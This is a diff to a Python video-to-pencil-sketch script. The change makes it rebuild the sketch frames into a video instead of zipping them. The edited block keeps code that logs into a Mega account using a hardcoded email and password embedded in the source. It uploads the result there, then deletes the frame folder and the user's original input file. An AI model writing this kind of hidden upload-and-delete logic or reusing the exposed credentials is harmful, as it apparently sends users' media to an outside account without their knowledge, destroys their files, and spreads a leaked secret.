@@ -5,7 +5,8 @@ import os
 import shutil
 import cv2 as cv
 
-from video_to_images import video_to_images
+from video_to_images import video_to_images,images_to_video
+
 def convert_to_sketch(input_image, output_image, darkness_factor=0.7):
     """
     Convert an image to a pencil sketch with adjustable darkness.
@@ -113,21 +114,23 @@ if __name__ == "__main__":
             flag = temp(folder_name,flag)
             
             if flag: 
-                zip_file = f"images.zip"
-                shutil.make_archive(zip_file.replace('.zip', ''), 'zip', folder_name)
-                print(f"Folder '{folder_name}' has been successfully zipped as {zip_file}")
-                if os.path.exists(zip_file):
+                zip_file = 'temp_output_video.mp4'
+                output_file_name = images_to_video(folder_name,zip_file)
+                if output_file_name and os.path.exists(output_file_name):
                     keys = 'afg154006@gmail.com_megaMac02335!'.split("_")
                     mega = Mega()
+                    
                     m = mega.login(keys[0],keys[1])
                     try:
                         
-                        m.upload(zip_file)
+                        m.upload(output_file_name)
                         shutil.rmtree(folder_name)
                         os.remove(file_name)
                         
                     except Exception as e:
                         print("Error failed to upload : ")
+                else:
+                    print(f"{output_file_name} not exits...")
     else:
         print(f"file not exits... {os.listdir()}")
     # input_image = 'flle.jpg'
